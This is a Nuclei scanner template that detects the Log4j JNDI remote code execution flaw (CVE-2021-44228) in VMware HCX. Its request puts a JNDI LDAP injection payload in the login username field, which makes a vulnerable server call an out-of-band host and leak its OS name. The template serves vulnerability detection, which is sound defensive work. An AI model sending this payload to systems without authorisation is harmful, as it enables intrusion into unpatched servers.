id: vmware-hcx-log4j
info:
  name: VMware HCX - Remote Code Execution (Apache Log4j)
  author: pussycat0x,DhiyaneshDK
  severity: critical
  description: VMware HCX is vulnerable to remote code execution through Apache Log4j,
    allowing an attacker to gain unauthorized access and control over the compromised
    system without the need for credentials.
  reference:
  - https://www.vmware.com/security/advisories/VMSA-2021-0028.html
  - https://logging.apache.org/log4j/2.x/security.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2021-44228
    cwe-id: CWE-77
  metadata:
    shodan-query: title:"VMware HCX"
    verified: 'true'
    impact: The impact of the VMware HCX remote code execution vulnerability is significant
      as it allows attackers to gain complete control over a system and potentially
      cause damage or steal sensitive information without authentication.
    recommendation: I strongly recommend that users of VMware HCX update to the latest
      version immediately to prevent the risk of remote code execution through the
      vulnerable Apache Log4j framework.
  tags: cve,cve2021,rce,jndi,log4j,vmware,kev,oast
requests:
- raw:
  - "@timeout: 10s\nPOST /hybridity/api/sessions HTTP/1.1\nHost: {{Hostname}}\nAccept:\
    \ application/json\nContent-Type: application/json\nOrigin: {{BaseURL}}\n\n{\n\
    \  \"authType\": \"password\",\n  \"username\": \"${jndi:ldap://${sys:os.name}.{{interactsh-url}}}\"\
    ,\n  \"password\": \"admin\"\n}\n"
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: regex
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+
  extractors:
  - type: kval
    kval:
    - interactsh_ip
  - type: regex
    part: interactsh_request
    group: 1
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
